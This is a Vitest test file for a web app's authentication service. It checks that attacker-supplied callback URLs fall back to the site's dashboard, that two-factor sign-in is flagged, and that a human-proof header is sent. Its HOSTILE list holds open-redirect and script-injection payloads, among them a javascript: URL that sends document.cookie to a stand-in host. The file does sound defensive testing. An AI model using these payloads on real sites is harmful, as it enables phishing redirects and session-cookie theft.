import { beforeEach, describe, expect, it, vi } from "vitest";

const client = vi.hoisted(() => ({
  signInEmail: vi.fn(),
  signUpEmail: vi.fn(),
  signInSocial: vi.fn(),
  sendVerificationEmail: vi.fn(),
  requestPasswordReset: vi.fn(),
}));

vi.mock("@/lib/auth-client", () => ({
  signIn: { email: client.signInEmail, social: client.signInSocial },
  signUp: { email: client.signUpEmail },
  signOut: vi.fn(),
  sendVerificationEmail: client.sendVerificationEmail,
  requestPasswordReset: client.requestPasswordReset,
  resetPassword: vi.fn(),
  changePassword: vi.fn(),
}));
vi.mock("@/lib/anti-automation/client", () => ({ solveHumanProof: async () => ({ "x-human-proof": "proof" }) }));

import { authService } from "@/lib/auth-service";

/** What a link built by an attacker can put in `?callbackUrl=`. */
const HOSTILE = [
  "https://evil.example/phish",
  "//evil.example",
  "/\\evil.example",
  "javascript:fetch('https://evil.example/?c='+document.cookie)",
  "data:text/html,<script>alert(1)</script>",
  "/\t/evil.example",
  "%2F%2Fevil.example",
];

beforeEach(() => {
  vi.clearAllMocks();
  client.signInEmail.mockResolvedValue({ data: {}, error: null });
  client.signUpEmail.mockResolvedValue({ data: {}, error: null });
  client.signInSocial.mockResolvedValue({});
  client.sendVerificationEmail.mockResolvedValue({ error: null });
  client.requestPasswordReset.mockResolvedValue({ error: null });
});

describe("authService never hands better-auth an address outside the site", () => {
  it.each(HOSTILE)("sign-in with %s goes to the dashboard", async (callbackURL) => {
    await authService.signInWithEmail({ email: "a@b.fr", password: "x", callbackURL });
    expect(client.signInEmail.mock.calls[0][0].callbackURL).toBe("/dashboard");
  });

  it.each(HOSTILE)("sign-up with %s goes to the dashboard", async (callbackURL) => {
    await authService.signUpWithEmail({ email: "a@b.fr", password: "x", name: "Ada", callbackURL });
    expect(client.signUpEmail.mock.calls[0][0].callbackURL).toBe("/dashboard");
  });

  it.each(HOSTILE)("a provider sign-in with %s goes to the dashboard", async (callbackURL) => {
    await authService.signInWithProvider("github", callbackURL);
    expect(client.signInSocial.mock.calls[0][0].callbackURL).toBe("/dashboard");
  });

  it.each(HOSTILE)("the verification link with %s comes back to the dashboard of this site", async (callbackPath) => {
    await authService.sendVerificationEmail("a@b.fr", callbackPath);
    const { callbackURL } = client.sendVerificationEmail.mock.calls[0][0];
    expect(callbackURL.endsWith("/dashboard")).toBe(true);
    expect(callbackURL).not.toContain("evil");
  });

  it("keeps a path of the site", async () => {
    await authService.signInWithEmail({ email: "a@b.fr", password: "x", callbackURL: "/fr/learn/react?x=1" });
    expect(client.signInEmail.mock.calls[0][0].callbackURL).toBe("/fr/learn/react?x=1");
  });
});

describe("authService and the second factor", () => {
  it("says a second factor is due when the server asks for one", async () => {
    client.signInEmail.mockResolvedValue({ data: { twoFactorRedirect: true }, error: null });
    await expect(authService.signInWithEmail({ email: "a@b.fr", password: "x" })).resolves.toEqual({ success: true, requiresTwoFactor: true });
  });

  it("does not, for an ordinary sign-in", async () => {
    await expect(authService.signInWithEmail({ email: "a@b.fr", password: "x" })).resolves.toEqual({ success: true });
  });
});

describe("authService and the proof of work", () => {
  it("sends the proof with sign-in, sign-up and password-reset requests", async () => {
    await authService.signInWithEmail({ email: "a@b.fr", password: "x" });
    await authService.signUpWithEmail({ email: "a@b.fr", password: "x", name: "Ada" });
    await authService.requestPasswordReset("a@b.fr");
    for (const mock of [client.signInEmail, client.signUpEmail, client.requestPasswordReset]) {
      expect(mock.mock.calls[0][0].fetchOptions.headers["x-human-proof"]).toBe("proof");
    }
  });
});
